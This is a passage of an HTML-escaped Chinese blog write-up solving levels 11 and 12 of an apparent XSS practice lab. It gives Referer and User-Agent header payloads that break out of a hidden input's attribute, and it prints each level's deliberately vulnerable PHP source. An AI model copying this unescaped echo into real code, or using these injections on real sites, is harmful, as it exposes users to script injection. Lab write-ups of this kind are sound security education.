invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 11&lt;&#x2F;p&gt;
&lt;p&gt;查看网页源代码发现有四个hidden，分别尝试传值发现t_sort有回显，但几乎所有方法都被过滤，猜测t_ref为Referer头&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135104746.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135104746.png&quot; alt&#x3D;&quot;image-20240204135104746&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;BP抓包向Referer头填充数值1即可发现回显在t_ref内，可以在Referer头内构造Payload，相应包正确后在抓到的包内添加Referer头并放包即可。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135754206.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204135754206.png&quot; alt&#x3D;&quot;image-20240204135754206&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;Referer: &quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level12.php?keyword&#x3D;good job!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level11&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level11&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_SERVER&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;HTTP_REFERER&#x27;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_ref&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level11.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 12&lt;&#x2F;p&gt;
&lt;p&gt;与11题原理相同，注入点在UA头&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;User-Agent: &quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level13.php?keyword&#x3D;good job!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level12&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level12&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_SERVER&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;HTTP_USER_AGENT&#x27;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_ua&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span 